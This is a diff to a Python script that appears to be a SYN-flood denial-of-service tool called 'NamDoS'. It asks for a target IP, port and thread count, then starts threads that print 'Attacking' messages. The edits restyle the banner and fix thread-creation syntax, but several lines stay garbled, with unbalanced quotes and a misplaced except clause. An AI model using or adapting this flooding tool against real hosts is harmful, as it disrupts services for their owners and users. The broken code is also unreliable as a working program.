@@ -5,6 +5,9 @@ import os
 import time
 from termcolor import colored
 os.system('cls')
+
+def logo():
+  logo = """
 _   _                       _____             _____ 
  | \ | |                     |  __ \           / ____|
  |  \| |   __ _   _ __ ___   | |  | |   ___   | (___  
@@ -12,7 +15,9 @@ _   _                       _____             _____
  | |\  | | (_| | | | | | | | | |__| | | (_) |  ____) |
  |_| \_|  \__,_| |_| |_| |_| |_____/   \___/  |_____/
                                Copyright: Vo Hoang Nam
-print(colored("\n===========================================================\n", 'red'))
+
+"""
+  print (logo)
 
 ip = str(input(colored("[+] IP: ", 'green')))
 port = int(input(colored ("[+] Port: ", 'green'))) 
@@ -38,7 +43,7 @@ bb + 1
 print(colored('[+] Attacking '+ip +">>>Sent: +str(bb), except KeyboardInterrupt:
 h.close()
 print(colored("[+++] DONE !!!!", "green")) 
-pass 'red'))
+pass
 for b in range(thread):
-thread - threading.Thread(target-syn)
+thread - threading.Thread(target=syn)
 thread.start()
